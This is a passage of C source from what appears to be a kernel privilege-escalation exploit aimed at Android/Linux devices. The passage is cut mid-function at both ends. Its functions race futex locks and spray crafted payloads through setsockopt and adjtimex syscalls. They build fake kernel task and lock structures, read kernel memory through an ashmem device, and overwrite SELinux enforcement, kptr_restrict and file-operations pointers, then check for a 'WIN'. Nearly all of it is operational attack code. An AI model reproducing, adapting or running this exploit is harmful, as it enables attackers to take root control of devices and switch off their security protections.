          "SLIDE_TCP_REPAIR_SPIN", 2000, 0, 1000000);
      unsigned long repair_deadline_ms =
          (unsigned long)env_int_range("SLIDE_TCP_REPAIR_MS", 3000, 1, 60000);
      unsigned long repair_count = 0;
      unsigned long dorm_budget =
          slide_waiter_nosys
              ? (unsigned long)env_int_range("SLIDE_WAIT_SECONDS",
                                             SLIDE_WAIT_SECONDS, 1, 120) *
                    20000000UL
              : 0;
      unsigned long owed_budget = 2000000UL;
      unsigned long owed_ns = 0;
      int owed_timed = 0;
      for (;;) {
        if (!atomic_load(&slide_heal_req)) {
          if (slide_waiter_nosys) {
            if (slide_round_win || atomic_load(&slide_consume_stop) ||
                slide_walk_done >= (int)walk_target || dorm_budget <= 20000UL) {
              break;
            }
            for (int v97_slice = 0; v97_slice < 20; v97_slice++) {
              if (slide_verdict_pending()) {
                gsr_build_payload(gsr);
                setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
              }
              for (volatile unsigned long g = 0; g < 1000UL; g++) {
                __asm__ volatile("yield" ::: "memory");
              }
            }
            dorm_budget -= 20000UL;
            continue;
          }
          unsigned long dorm_ns = (unsigned long)gettime_ns();
          if (slide_round_win || atomic_load(&slide_consume_stop) ||
              slide_walk_done >= (int)walk_target ||
              (dorm_ns - t0) >= repair_deadline_ms * 1000000UL) {
            break;
          }
          if (slide_verdict_pending()) {
            gsr_build_payload(gsr);
            setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
          }
          for (volatile unsigned long g = 0; g < 20000UL; g++) {
            __asm__ volatile("yield" ::: "memory");
          }
          continue;
        }
        int owed =
            atomic_load(&slide_heal_req) && !atomic_load(&slide_heal_ack);
        unsigned long now_ns =
            slide_waiter_nosys ? 0 : (unsigned long)gettime_ns();
        if (owed) {
          if (slide_waiter_nosys) {
            if (owed_budget <= repair_spin) {
              break;
            }
          } else if (!owed_timed) {
            owed_timed = 1;
            owed_ns = now_ns;
          } else if (now_ns - owed_ns >= 100UL * 1000000UL) {
            break;
          }
        } else {
          owed_timed = 0;
          if (slide_waiter_nosys) {
            if (slide_round_win || atomic_load(&slide_consume_stop) ||
                slide_walk_done >= (int)walk_target) {
              break;
            }
          } else if (slide_round_win || atomic_load(&slide_consume_stop) ||
                     slide_walk_done >= (int)walk_target ||
                     (now_ns - t0) >= repair_deadline_ms * 1000000UL) {
            break;
          }
        }
        errno = 0;
        gsr_build_payload(gsr);
        int ack_ret =
            setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
        int saved_errno = errno;
        if (atomic_load(&slide_heal_req) &&
            atomic_load(&slide_last_copy_shape) == 1) {
          if (atomic_load(&slide_v114_stage) == SLIDE_V114_STAGE_PROBE &&
              !env_flag("SLIDE_PROBE_DEFER_UNLOCK", 0) &&
              !env_flag("SLIDE_NO_POST_UNLOCK", 0)) {
            atomic_store(&slide_futex_gate, 0);
            slide_futex_guard("waiter-probe-preack-unlock", FUTEX_UNLOCK_PI);
            futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            atomic_store(&slide_probe_unlocked, 1);
            slide_probe("probe-preack-unlock");
          }
          atomic_store(&slide_heal_ack, 1);
          if (!slide_waiter_nosys) {
            pr_info(
                "slide heal ack done copy_shape=%d ret=%d errno=%d count=%lu\n",
                atomic_load(&slide_last_copy_shape), ack_ret, saved_errno,
                repair_count + 1);
          }
          break;
        }
        repair_count++;
        for (unsigned long spin = 0; spin < repair_spin; spin++) {
          __asm__ volatile("yield" ::: "memory");
        }
        if (owed) {
          owed_budget -= repair_spin + 1;
        }
      }
      if (slide_paint_route() == 1 && slide_v114_twostage() &&
          atomic_load(&slide_v114_stage) == SLIDE_V114_STAGE_PROBE &&
          !slide_round_win && !atomic_load(&slide_consume_stop)) {
        if (env_flag("SLIDE_ARM_FROZEN", 0)) {
          long fz_cap_ms = (long)env_int_range("SLIDE_V118_ARM_WINDOW_MS", 5000,
                                               100, 600000);
          long fz_waited = 0;
          pr_info("v140 frozen arm window enter seq=%d banked=%d cap=%ldms\n",
                  (int)atomic_load(&slide_heal_seq),
                  (int)atomic_load(&slide_pc_win_banked), fz_cap_ms);
          while ((!atomic_load(&slide_frozen_paint_req) ||
                  atomic_load(&slide_v114_stage) != SLIDE_V114_STAGE_ARM) &&
                 !slide_round_win && !atomic_load(&slide_consume_stop) &&
                 fz_waited < fz_cap_ms) {
            usleep(1000);
            fz_waited++;
          }
          if (atomic_load(&slide_frozen_paint_req) &&
              atomic_load(&slide_v114_stage) == SLIDE_V114_STAGE_ARM &&
              !slide_round_win && !atomic_load(&slide_consume_stop)) {
            int fz_ret;
            int fz_errno;
            unsigned long fz_spin = 0;
            errno = 0;
            gsr_build_payload(gsr);
            fz_ret =
                setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
            fz_errno = errno;
            atomic_store(&slide_frozen_paint_done, 1);
            while (fz_spin < SLIDE_FROZEN_SPIN_MAX && !slide_round_win &&
                   !atomic_load(&slide_consume_stop)) {
              __asm__ volatile("yield" ::: "memory");
              fz_spin++;
            }
            slide_v121e_stamp(&slide_v121e_win_exit_ns);
            pr_info("v140 frozen arm window exit painted=1 ret=%d errno=%d "
                    "spin=%lu win=%d stop=%d\n",
                    fz_ret, fz_errno, fz_spin, slide_round_win,
                    atomic_load(&slide_consume_stop));
          } else {
            slide_v121e_stamp(&slide_v121e_win_exit_ns);
            pr_info("v140 frozen arm window abort-before-paint waited=%ldms "
                    "req=%d stage=%d win=%d stop=%d\n",
                    fz_waited, atomic_load(&slide_frozen_paint_req),
                    (int)atomic_load(&slide_v114_stage), slide_round_win,
                    atomic_load(&slide_consume_stop));
          }
        } else {
          unsigned long aw_t0 =
              slide_waiter_nosys ? 0 : (unsigned long)gettime_ns();
          long aw_cap_ms = (long)env_int_range("SLIDE_V118_ARM_WINDOW_MS", 5000,
                                               100, 600000);
          unsigned long aw_budget =
              slide_waiter_nosys ? (unsigned long)aw_cap_ms * 400000UL : 0;
          unsigned long aw_count = 0;
          int aw_acked_arm = 0;
          pr_info("v118 arm window enter seq=%d banked=%d cap=%ldms\n",
                  (int)atomic_load(&slide_heal_seq),
                  (int)atomic_load(&slide_pc_win_banked), aw_cap_ms);
          for (;;) {
            if (slide_round_win || atomic_load(&slide_consume_stop)) {
              break;
            }
            if (aw_acked_arm && !atomic_load(&slide_heal_req)) {
              break;
            }
            if (slide_waiter_nosys) {
              if (aw_budget <= repair_spin) {
                break;
              }
            } else if ((unsigned long)gettime_ns() - aw_t0 >=
                       (unsigned long)aw_cap_ms * 1000000UL) {
              break;
            }
            errno = 0;
            gsr_build_payload(gsr);
            int aw_ret =
                setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
            int aw_errno = errno;
            aw_count++;
            if (atomic_load(&slide_heal_req) && !atomic_load(&slide_heal_ack) &&
                atomic_load(&slide_last_copy_shape) == 1) {
              atomic_store(&slide_heal_ack, 1);
              if (atomic_load(&slide_heal_seq) >= 2) {
                aw_acked_arm = 1;
                if (!slide_waiter_nosys) {
                  pr_info("v118 arm window ack seq=%d ret=%d errno=%d "
                          "count=%lu\n",
                          (int)atomic_load(&slide_heal_seq), aw_ret, aw_errno,
                          aw_count);
                }
              }
            }
            for (unsigned long spin = 0; spin < repair_spin; spin++) {
              __asm__ volatile("yield" ::: "memory");
            }
            if (slide_waiter_nosys) {
              aw_budget -= repair_spin + 1;
            }
          }
          slide_v121e_stamp(&slide_v121e_win_exit_ns);
          pr_info("v118 arm window exit acked=%d count=%lu seq=%d req=%d "
                  "win=%d stop=%d\n",
                  aw_acked_arm, aw_count, (int)atomic_load(&slide_heal_seq),
                  (int)atomic_load(&slide_heal_req), slide_round_win,
                  (int)atomic_load(&slide_consume_stop));
        }
      }
      atomic_store(&slide_consume_stop, 1);
      if (!slide_round_win && !slide_waiter_nosys) {
        pr_info("slide tcp gsr repair done count=%lu win=%d walks_done=%d "
                "stop=%d elapsed_ms=%lu\n",
                repair_count, slide_round_win, slide_walk_done,
                atomic_load(&slide_consume_stop),
                (((unsigned long)gettime_ns() - t0) / 1000000UL));
      }
    }
  } else {
    atomic_store(&slide_consume_go, 0);
    atomic_store(&slide_consume_stop, 1);
  }
  if (!env_flag("SLIDE_QUIET_TAIL", 1)) {
    slide_probe("gsr-loop-done");
    pr_info("slide tcp gsr burst done i=%lu frozen\n", attempts_eff);
    close(s);
    pr_info("slide tcp gsr side effect calls=%d sched_ok=%d\n",
            atomic_load(&slide_consume_calls),
            atomic_load(&slide_consume_sched_ok));
  }
}

#define SLIDE_ADJ_BUF_SIZE 0xD0
#define SLIDE_ADJ_WAITER_SHIFT 0x10
#ifndef SYS_adjtimex
#define SYS_adjtimex 171
#endif
static void adj_build_payload(unsigned char *tx) {
  const char *tfill = getenv("SLIDE_TEST_FILL");
  unsigned char fillv = 0x41;
  const char *tfv = getenv("SLIDE_TEST_FILL_VAL");
  if (tfv) {
    fillv = (unsigned char)strtoul(tfv, NULL, 0);
  }
  memset(tx, tfill ? fillv : 0, SLIDE_ADJ_BUF_SIZE);
  if (slide_gsr_attempt && !tfill) {
    memset(tx, 0x40 | (unsigned char)(slide_gsr_attempt & 0xF),
           SLIDE_ADJ_BUF_SIZE);
  }
  if (!tfill) {
    for (size_t off = 0; off + 8 <= SLIDE_ADJ_BUF_SIZE; off += 8) {
      put64(tx, off, SLIDE_BSS_SAFE_TASK);
    }
  }
  put32(tx, 0, 0x100);
  uint64_t sh = SLIDE_ADJ_WAITER_SHIFT;
  const char *tsh = getenv("SLIDE_ADJ_SHIFT");
  if (tsh) {
    sh = strtoull(tsh, NULL, 0);
  }
  if (sh + 0x58 > SLIDE_ADJ_BUF_SIZE) {
    pr_error("slide adj shift %llx exceeds buffer\n", (unsigned long long)sh);
    return;
  }
  const char *tgt = slide_shape_target();
  uint64_t tree_pc;
  uint64_t tree_right = 0;
  uint64_t tree_left;
  if (tgt && !strcmp(tgt, "selinux")) {
    tree_pc = (SLIDE_SELINUX_STATE - 8);
    tree_left = 0;
  } else if (tgt && !strcmp(tgt, "kptr")) {
    tree_pc = (SLIDE_KPTR_RESTRICT - 8);
    tree_left = 0;
  } else if (tgt && !strcmp(tgt, "panic")) {
    tree_pc = SLIDE_LOGGERS_0_1;
    tree_left = 0x8ULL;
  } else if (tgt && !strcmp(tgt, "w2")) {
    uint64_t w2target = 0;
    uint64_t w2value = 0;
    const char *ta = getenv("GL_TARGET");
    const char *va = getenv("GL_W0");
    if (ta) {
      w2target = strtoull(ta, NULL, 0);
    }
    if (!va || !strcmp(va, "auto")) {
      w2value = (uint64_t)(fake_task + 0x400);
    } else {
      w2value = strtoull(va, NULL, 0);
    }
    tree_pc = (w2target - 8);
    tree_right = 0;
    tree_left = w2value;
  } else if (tgt && (!strcmp(tgt, "fops") || !strcmp(tgt, "probe") ||
                     !strcmp(tgt, "repair"))) {
    struct slide_v114_shape vs = slide_v114_shape_for(
        tgt, fake_fops, ASHMEM_MISC_FOPS_SLOT, PROBE_SCRATCH, PROBE_MARK_DELTA);
    tree_pc = vs.pc;
    tree_right = vs.right;
    tree_left = vs.left;
  } else if (tgt && !strcmp(tgt, "leak")) {
    tree_pc = fake_lock + 0x118;
    tree_right = SLIDE_LEAK_T;
    tree_left = 0;
  } else {
    tree_pc = SLIDE_LOGGERS_0_1;
    tree_left = SLIDE_RANDOM_BOOT_ID_DATA;
  }
  {
    unsigned long pc_window = 3000;
    const char *pwv = getenv("SLIDE_PC_WINDOW");
    if (pwv) {
      pc_window = strtoul(pwv, NULL, 0);
    }
    if (pc_window && slide_gsr_attempt > pc_window &&
        !slide_verdict_pending()) {
      tree_pc = 0;
    }
  }
  if (slide_pc_win_banked) {
    tree_pc = 0;
  }
  if (tree_pc == 0 && (tree_left == ASHMEM_MISC_FOPS_SLOT ||
                       tree_right == ASHMEM_MISC_FOPS_SLOT)) {
    tree_left = 0;
    tree_right = 0;
  }
  if (tree_pc != 0) {
    uint64_t sright = slide_selinux_right();
    if (sright) {
      tree_right = sright;
    }
  }
  if (tfill) {
    return;
  }
  put64(tx, (size_t)(sh + 0x00), tree_pc);
  put64(tx, (size_t)(sh + 0x08), tree_right);
  {
    int v2c_t = slide_tgt_v2c(tgt);
    put64(tx, (size_t)(sh + 0x30),
          v2c_t ? SLIDE_BSS_SAFE_TASK : SLIDE_INIT_TASK);
  }
  uint64_t glk = slide_lock_addr();
  const char *tlk = getenv("SLIDE_TEST_LOCK");
  if (tlk) {
    glk = strtoull(tlk, NULL, 0);
  }
  if (tgt && !strcmp(tgt, "leak")) {
    glk = fake_lock;
  }
  put64(tx, (size_t)(sh + 0x38), glk);
  if (slide_gsr_attempt == 0 || slide_gsr_attempt == 1) {
    pr_info("slide shape echo(tx) tgt=%s i=%lu pc=%016llx right=%016llx "
            "left=%016llx lock=%016llx\n",
            tgt ? tgt : "(null)", (unsigned long)slide_gsr_attempt,
            (unsigned long long)tree_pc, (unsigned long long)tree_right,
            (unsigned long long)tree_left, (unsigned long long)glk);
  }
  put64(tx, (size_t)(sh + 0x18), SLIDE_BSS_SAFE_TASK);
  put64(tx, (size_t)(sh + 0x20), SLIDE_BSS_SAFE_TASK);
  put64(tx, (size_t)(sh + 0x28), SLIDE_BSS_SAFE_TASK);
  if (!slide_tgt_v2c(tgt)) {
    put32(tx, (size_t)(sh + 0x40), 0);
    put32(tx, (size_t)(sh + 0x44),
          (int)env_int_range("SLIDE_GSR_PRIO", 130, 1, 139));
  }
  put64(tx, (size_t)(sh + 0x50), 0);
  atomic_fetch_add(&slide_copy_version, 1);
}

void slide_adjtimex_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error(
        "slide adj missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
        page_base, fake_lock, fake_w0);
    return;
  }
  unsigned char tx[SLIDE_ADJ_BUF_SIZE];
  adj_build_payload(tx);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_gsr_painted, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_fire_done, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  pr_info("slide adj enter page=%016zx lock=%016zx task=%016llx "
          "attempts=%lu arm=%lu hold=%lu\n",
          page_base, fake_lock, (unsigned long long)SLIDE_INIT_TASK,
          slide_tcp_route_attempts(), slide_tcp_route_arm_seq(),
          slide_tcp_post_hold());
  unsigned long post_hold = slide_tcp_post_hold();
  unsigned long attempts = slide_tcp_route_attempts();
  unsigned long arm_seq = slide_tcp_route_arm_seq();
  unsigned long walk_target = (unsigned long)slide_walk_retries();
  int fire_burst = env_int_range("SLIDE_TCP_FIRE_BURST", 0, 0, 1000000);
  unsigned long attempts_eff =
      fire_burst > 0 ? arm_seq + (unsigned long)fire_burst : attempts;
  slide_probe("adj-enter");

  for (unsigned long i = 1; i <= attempts_eff; i++) {
    if (atomic_load(&slide_consume_stop) || slide_round_win ||
        atomic_load(&slide_paint_gate) || slide_walk_done >= (int)walk_target) {
      if (!slide_waiter_nosys) {
        pr_info("slide adj stop at i=%lu win=%d walks_done=%d "
                "walk_target=%lu\n",
                i, slide_round_win, slide_walk_done, walk_target);
      }
      break;
    }
    int calls_before = atomic_load(&slide_consume_calls);
    if (i >= arm_seq) {
      atomic_store(&slide_consume_go, (int)i);
    }
    slide_gsr_attempt = i;
    adj_build_payload(tx);
    if ((int)i == (int)arm_seq) {
      pr_info("slide adj ARM now i=%lu go_set=1 page=%016zx\n", i, page_base);
      slide_probe("adj-arm");
    }
    errno = 0;
    int ret = (int)syscall(SYS_adjtimex, tx);
    int saved_errno = errno;
    if (i == 1) {
      atomic_store(&slide_gsr_painted, 1);
      char pb[48];
      snprintf(pb, sizeof(pb), "adj-r1 ret=%d e=%d", ret, saved_errno);
      slide_probe(pb);
    }
    if (i >= arm_seq) {
      if (post_hold) {
        for (unsigned long spin = 0; spin < post_hold; spin++) {
          __asm__ volatile("yield" ::: "memory");
        }
      }
    }
    int calls = atomic_load(&slide_consume_calls);
    if (!slide_waiter_nosys && (env_flag("SLIDE_TCP_LOG_EACH", 0) ||
                                (i % 100) == 0 || calls > calls_before)) {
      pr_info("slide adj seq=%lu ret=%d errno=%d calls=%d "
              "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
              i, ret, saved_errno, calls, atomic_load(&slide_consume_sched_ok),
              atomic_load(&slide_consume_last_sched_ret),
              atomic_load(&slide_consume_last_sched_errno));
    }
    if (env_flag("SLIDE_TCP_FIRE_BREAK", 0) && calls > calls_before) {
      if (!slide_waiter_nosys) {
        pr_info("slide adj fire-break at i=%lu calls=%d\n", i, calls);
      }
      break;
    }
  }
  if (slide_spy_on) {
    atomic_store(&slide_spy_stop, 1);
    pthread_join(slide_spy_handle, NULL);
  }
  if (fire_burst > 0) {
    atomic_store(&slide_burst_done, 1);
  } else {
    atomic_store(&slide_consume_go, 0);
    atomic_store(&slide_consume_stop, 1);
  }
  if (!env_flag("SLIDE_QUIET_TAIL", 1)) {
    slide_probe("adj-loop-done");
    pr_info("slide adj burst done i=%lu frozen\n", attempts_eff);
    pr_info("slide adj side effect calls=%d sched_ok=%d\n",
            atomic_load(&slide_consume_calls),
            atomic_load(&slide_consume_sched_ok));
  }
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error(
        "slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
        page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_gsr_painted, 1);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_fire_done, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  slide_dump_walk_state(env_flag("SLIDE_PROBE", 0) ? "pre-fire" : "pre");
  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static int slide_enforce_value(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    return -1;
  }
  char ebuf[8];
  ssize_t en = read(efd, ebuf, sizeof(ebuf) - 1);
  close(efd);
  if (en <= 0) {
    return -1;
  }
  ebuf[en] = 0;
  while (en > 0 && (ebuf[en - 1] == '\n' || ebuf[en - 1] == ' ' ||
                    ebuf[en - 1] == '\r' || ebuf[en - 1] == '\t')) {
    ebuf[--en] = 0;
  }
  if (en == 1 && ebuf[0] == '0') {
    return 0;
  }
  if (en == 1 && ebuf[0] == '1') {
    return 1;
  }
  return -1;
}

static int slide_enforce_is_zero(void) { return slide_enforce_value() == 0; }

static int slide_dump_cached_fd = -1;
static int slide_dump_fd(void) {
  int cached = slide_dump_cached_fd;
  if (cached < 0) {
    cached = open_ashmem_device();
  }
  slide_dump_cached_fd = cached;
  return cached;
}

int slide_probe_cached_fd(void) { return slide_dump_cached_fd; }

static void slide_owner_state_sample(int tid, char *state_out, char *wchan_out,
                                     size_t wchan_sz) {
  char path[64];
  char buf[160];
  *state_out = '?';
  wchan_out[0] = 0;
  if (tid <= 0) {
    return;
  }
  snprintf(path, sizeof(path), "/proc/%d/stat", tid);
  int sfd = open(path, O_RDONLY | O_CLOEXEC);
  if (sfd >= 0) {
    ssize_t n = read(sfd, buf, sizeof(buf) - 1);
    close(sfd);
    if (n > 0) {
      buf[n] = 0;
      char *rp = strrchr(buf, ')');
      if (rp && rp[1] == ' ' && rp[2]) {
        *state_out = rp[2];
      }
    }
  }
  snprintf(path, sizeof(path), "/proc/%d/wchan", tid);
  int wfd = open(path, O_RDONLY | O_CLOEXEC);
  if (wfd >= 0) {
    ssize_t n = read(wfd, wchan_out, wchan_sz - 1);
    close(wfd);
    if (n > 0) {
      wchan_out[n] = 0;
      while (n > 0 && (wchan_out[n - 1] == '\n' || wchan_out[n - 1] == ' ')) {
        wchan_out[--n] = 0;
      }
    }
  }
}

static int slide_kill_gate(int otid, const char *tag, long cap_ms) {
  char st = '?';
  char wc[80];
  long waited = 0;
  for (;;) {
    int in_rq = atomic_load(&slide_waiter_in_requeue);
    slide_owner_state_sample(otid, &st, wc, sizeof(wc));
    if (st == 'S' || st == 'D') {
      if (in_rq) {
        break;
      }
      if (slide_walk_done == 0) {
        unsigned long stale_ms =
            (unsigned long)((gettime_ns() - slide_requeue_exit_ns) /
                            1000000ULL);
        pr_warning("v106 kill-gate fire %s state=%c waited=%ldms "
                   "walk_done=0 in_requeue=0 requeue_stale_ms=%lu\n",
                   tag, st, waited, stale_ms);
        return 1;
      }
      break;
    }
    if (slide_walk_done != 0 || slide_round_win ||
        atomic_load(&slide_consume_stop) || waited >= cap_ms) {
      break;
    }
    usleep(1000);
    waited++;
  }
  pr_warning(
      "v106 kill-gate NO-KILL %s -> park (state=%c walk_done=%d "
      "in_requeue=%d requeue_stale_ms=%lu waited=%ldms)\n",
      tag, st, slide_walk_done, atomic_load(&slide_waiter_in_requeue),
      (unsigned long)((gettime_ns() - slide_requeue_exit_ns) / 1000000ULL),
      waited);
  return 0;
}

static void slide_owner_state_print(const char *when) {
  int tid = (int)atomic_load(&slide_owner_tid);
  char path[64];
  char sysc[80];
  if (tid <= 0) {
    pr_info("slide owner-state %s tid=n/a state=n/a wchan=n/a sysc=n/a\n",
            when);
    return;
  }
  char state;
  char wchan[80];
  slide_owner_state_sample(tid, &state, wchan, sizeof(wchan));
  snprintf(path, sizeof(path), "/proc/%d/syscall", tid);
  sysc[0] = 0;
  int yfd = open(path, O_RDONLY | O_CLOEXEC);
  if (yfd >= 0) {
    ssize_t n = read(yfd, sysc, sizeof(sysc) - 1);
    close(yfd);
    if (n > 0) {
      sysc[n] = 0;
      char *nl = strchr(sysc, '\n');
      if (nl) {
        *nl = 0;
      }
    }
  }
  pr_info("slide owner-state %s tid=%d state=%c wchan=%s sysc=%s\n", when, tid,
          state, wchan[0] ? wchan : "n/a", sysc[0] ? sysc : "n/a");
}

static void slide_v143_gate_open_if_parked(const char *tag) {
  if (!env_flag("SLIDE_V143_PARK_GATE", 1) || slide_v143_gate_open) {
    return;
  }
  int gtid = (int)atomic_load(&slide_owner_tid);
  char gst = '?';
  char gwc[80];
  int ghits = 0;
  for (int gk = 0; gk < 80 && ghits < 2; gk++) {
    slide_owner_state_sample(gtid, &gst, gwc, sizeof(gwc));
    if (gst == 'S' && strstr(gwc, "futex") != NULL) {
      ghits++;
    } else {
      ghits = 0;
    }
    usleep(25000);
  }
  if (ghits >= 2) {
    slide_v143_gate_open = 1;
    pr_info("v146 %s owner parked: gate open (state=%c wchan=%s)\n", tag, gst,
            gwc);
  } else {
    pr_warning("v146 %s owner NOT parked in 2s (state=%c wchan=%s) -> gate "
               "stays closed\n",
               tag, gst, gwc);
  }
}

static int slide_dump_walk_state(const char *when) {
  int dfd = slide_dump_fd();
  if (dfd < 0) {
    pr_warning("slide dump %s: no ashmem fd\n", when);
    return 0;
  }
  unsigned char lb[32];
  memset(lb, 0x5A, sizeof(lb));
  ssize_t lrd = configfs_read_once(dfd, slide_lock_addr(), lb, sizeof(lb));
  unsigned char sb[16];
  memset(sb, 0x5A, sizeof(sb));
  ssize_t srd = configfs_read_once(dfd, ASHMEM_MISC_FOPS_SLOT, sb, sizeof(sb));
  unsigned char cb[16];
  memset(cb, 0x5A, sizeof(cb));
  ssize_t crd = configfs_read_once(
      dfd, P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x02496f58ULL), cb,
      sizeof(cb));
  (void)srd;
  (void)crd;
  if (strcmp(when, "tcp-pre-fire") == 0) {
    uint64_t q0, q1;
    memcpy(&q0, sb + 0, sizeof(q0));
    memcpy(&q1, sb + 8, sizeof(q1));
    uint64_t clean0 = (q0 == 0 || q0 == 0x5a5a5a5a5a5a5a5aULL);
    uint64_t clean1 = (q1 == 0 || q1 == 0x5a5a5a5a5a5a5a5aULL);
    if (!clean0 || !clean1) {
      uint64_t dirty = clean0 ? q1 : q0;
      pr_warning("slide residue gate: DIRTY slot=%016llx - abort fire "
                 "(no walk, no kill)\n",
                 (unsigned long long)dirty);
      return 1;
    }
    if (lrd == (ssize_t)sizeof(lb)) {
      uint64_t root = 0;
      uint64_t leftmost = 0;
      memcpy(&root, lb + 8, sizeof(root));
      memcpy(&leftmost, lb + 16, sizeof(leftmost));
      if (root != 0 || leftmost != 0) {
        pr_warning("v107 slot-dirty gate: root=%016llx leftmost=%016llx - "
                   "abort fire (slot held by parked zombie)\n",
                   (unsigned long long)root, (unsigned long long)leftmost);
        return 1;
      }
      uint64_t lockowner;
      memcpy(&lockowner, lb + 24, sizeof(lockowner));
      if (lockowner != 0) {
        pr_warning("v120 slot-owner gate: owner=%016llx - abort fire "
                   "(no walk, no kill)\n",
                   (unsigned long long)lockowner);
        return 1;
      }
    } else {
      pr_warning("v107 slot-dirty gate: lrd=%zd short - tree state "
                 "unknown, continuing (channel blind: A-boot structural, "
                 "see v144 ledger gate)\n",
                 lrd);
    }
  }
  return 0;
}

static void slide_leak_readback_report(void);
static int slide_target_is_zero(void) {
  const char *tgt = slide_active_target();
  if (tgt && !strcmp(tgt, "kptr")) {
    int v = 1;
    FILE *f = fopen("/proc/sys/kernel/kptr_restrict", "r");
    if (f) {
      if (fscanf(f, "%d", &v) != 1) {
        v = -1;
      }
      fclose(f);
    }
    return v == 0 ? 1 : 0;
  }
  if (tgt && !strcmp(tgt, "selinux")) {
    return slide_enforce_is_zero() == 1;
  }
  if (tgt && !strcmp(tgt, "fops") && fake_fops) {
    return 0;
  }
  if (tgt && !strcmp(tgt, "w2")) {
    static const unsigned char w2want[8] = {0x00, 0x60, 0x34, 0x02,
                                            0x80, 0xff, 0xff, 0xff};
    unsigned char w2got[8] = {0};
    FILE *f = fopen("/proc/cmdline", "r");
    if (!f) {
      return 0;
    }
    size_t w2n = fread(w2got, 1, sizeof(w2got), f);
    fclose(f);
    return w2n == sizeof(w2got) && !memcmp(w2got, w2want, sizeof(w2got));
  }
  return 0;
}

static int slide_win_detected(void) {
  int w = slide_target_is_zero();
  if (w != 1) {
    return 0;
  }
  const char *vt = getenv("SLIDE_WRITE_TARGET");
  if (vt && !strcmp(vt, "selinux") && getenv("SLIDE_TEXT_ADDR") &&
      !atomic_exchange(&slide_next_target_fops, 1)) {
    pr_success("[!] slide selinux WIN -> retargeting paint to fops "
               "(dual-write phase 2)\n");
    return 0;
  }
  return 1;
}

static void slide_v97_verdict_window_pre_kill(void) {
  atomic_store(&slide_fire_done, 1);
  pr_warning("slide v97 post-arm repaint: verdict window open, "
             "waiter W-burst 60ms, then kill\n");
  const struct timespec v97_landing_ts = {.tv_sec = 0, .tv_nsec = 60000000};
  clock_nanosleep(CLOCK_MONOTONIC, 0, &v97_landing_ts, NULL);
}

static void slide_v113_frame_gate(void) {
  if (!env_flag("SLIDE_FRAME_GATE", 1)) {
    pr_warning("v113 frame-gate: disabled (SLIDE_FRAME_GATE=0) -> fire\n");
    util_mark_fops_armed("v113-frame-gate-disabled");
    return;
  }
  int verdict = util_frame_oracle("pre-fire");
  util_frame_band_dump("pre-fire");
  if (verdict == 1) {
    pr_warning("v113 frame-gate: owned -> fire\n");
    util_mark_fops_armed("v113-frame-gate-owned");
    return;
  }
  pr_warning("v113 frame-gate: not owned (verdict=%d) -> park without "
             "firing\n",
             verdict);
  slide_park_sleep();
}

static void slide_v114_wait_walk(int want_seq, const char *tag, uint64_t marker,
                                 size_t marker_off) {
  long cap_ms =
      (long)env_int_range("SLIDE_V114_WALK_WAIT_MS", 3000, 100, 60000);
  long waited = 0;
  while ((int)atomic_load(&slide_heal_seq) < want_seq && waited < cap_ms) {
    usleep(10000);
    waited += 10;
  }
  pr_warning(
